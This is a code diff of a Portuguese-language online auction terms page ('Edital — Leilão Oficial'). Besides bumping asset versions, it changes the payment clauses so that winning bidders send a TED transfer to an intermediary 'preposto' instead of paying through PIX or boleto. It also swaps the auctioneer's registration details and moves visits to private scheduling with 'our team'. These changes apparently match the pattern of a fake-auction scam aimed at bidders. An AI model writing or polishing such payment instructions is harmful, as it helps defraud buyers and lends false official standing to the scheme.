@@ -5,8 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Edital — Leilão Oficial</title>
   <meta name="description" content="Edital de leilão do Leilão Oficial.">
-  <link rel="icon" type="image/png" href="favicon.png?v=53">
-  <link rel="apple-touch-icon" href="apple-touch-icon.png?v=53">
+  <link rel="icon" type="image/png" href="favicon.png?v=70">
+  <link rel="apple-touch-icon" href="apple-touch-icon.png?v=70">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link rel="preconnect" href="https://srxtmyhcfncscjvyibhg.supabase.co" crossorigin>
@@ -14,7 +14,7 @@
   <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=Inter:wght@400;500;600&display=swap">
   <link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
   <noscript><link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"></noscript>
-  <link rel="stylesheet" href="css/styles.css?v=53">
+  <link rel="stylesheet" href="css/styles.css?v=70">
 </head>
 <body>
   <div id="site-header"></div>
@@ -25,15 +25,15 @@
     <p class="muted">Este edital reúne as condições gerais do leilão. Consulte o leiloeiro responsável em caso de dúvidas.</p>
 
     <table class="meta-table">
-      <tr><td>Leilão nº</td><td>LO-2026/01</td></tr>
+      <tr><td>Leilão nº</td><td data-edital="numero">—</td></tr>
       <tr><td>Modalidade</td><td>Online (exclusivamente eletrônico)</td></tr>
-      <tr><td>Data de abertura</td><td>26/10/2026, às 10h00</td></tr>
-      <tr><td>Data de encerramento</td><td>26/10/2026, a partir das 14h00</td></tr>
-      <tr><td>Visitação dos bens</td><td>22 a 24/10/2026, das 9h às 16h, no pátio indicado</td></tr>
-      <tr><td>Leiloeiro responsável</td><td>Ricardo Almeida (matrícula JUC/PR 12.345/2026)</td></tr>
+      <tr><td>Data de abertura</td><td data-edital="abertura">—</td></tr>
+      <tr><td>Data de encerramento</td><td data-edital="encerramento">—</td></tr>
+      <tr><td>Visitação dos bens</td><td>Confirmar agendamento prévio com a nossa equipe para designar o pátio indicado</td></tr>
+      <tr><td>Leiloeiro responsável</td><td>Ricardo Almeida (matrícula JUCESP/SP 12.638/2019)</td></tr>
       <tr><td>Comitente</td><td>Leilão Oficial</td></tr>
       <tr><td>Comissão do leiloeiro</td><td>5% sobre o valor de arrematação</td></tr>
-      <tr><td>Forma de pagamento</td><td>PIX, boleto ou transferência bancária, conforme instruções após a arrematação</td></tr>
+      <tr><td>Forma de pagamento</td><td>TED/TFF ao preposto leiloeiro indicado pelo leiloeiro oficial do leilão, para que realize a quitação dos débitos do lote junto à instituição financeira responsável</td></tr>
       <tr><td>Retirada dos bens</td><td>Mediante comprovação de pagamento e agendamento prévio no pátio indicado</td></tr>
       <tr><td>Central de atendimento</td><td>(41) 0000-0000 — seg. a sex., das 8h às 18h</td></tr>
     </table>
@@ -50,7 +50,7 @@
     </ol>
 
     <h2>3. Da visitação</h2>
-    <p>Recomenda-se a visitação dos bens nas datas indicadas. A ausência de visitação não poderá ser alegada posteriormente como motivo de desistência ou reclamação, por se tratar de venda no estado em que o bem se encontra.</p>
+    <p>A visitação dos bens é feita mediante agendamento prévio — confirme com a nossa equipe para designar o pátio indicado. A ausência de visitação não poderá ser alegada posteriormente como motivo de desistência ou reclamação, por se tratar de venda no estado em que o bem se encontra.</p>
 
     <h2>4. Dos lances</h2>
     <ol>
@@ -63,7 +63,7 @@
     <h2>5. Do pagamento</h2>
     <ol>
       <li>O arrematante deverá efetuar o pagamento do valor do lote e da comissão do leiloeiro no prazo indicado após o encerramento.</li>
-      <li>Os valores poderão ser pagos pelos meios informados na plataforma (ex.: PIX, boleto ou transferência).</li>
+      <li>O pagamento será realizado por TED/TFF ao preposto leiloeiro indicado pelo leiloeiro oficial do leilão, para que realize a quitação dos débitos do lote junto à instituição financeira responsável.</li>
       <li>O não pagamento no prazo caracteriza inadimplência, conforme a cláusula 8.</li>
     </ol>
 
@@ -129,10 +129,12 @@
 
   <div id="site-footer"></div>
 
-  <script src="js/data.js?v=53"></script>
+  <script src="js/data.js?v=70"></script>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js"></script>
-  <script src="js/supabase.js?v=53"></script>
-  <script src="js/auth.js?v=53"></script>
-  <script src="js/site.js?v=53"></script>
+  <script src="js/supabase.js?v=70"></script>
+  <script src="js/auth.js?v=70"></script>
+  <script src="js/store.js?v=70"></script>
+  <script src="js/site.js?v=70"></script>
+  <script src="js/edital.js?v=70"></script>
 </body>
 </html>
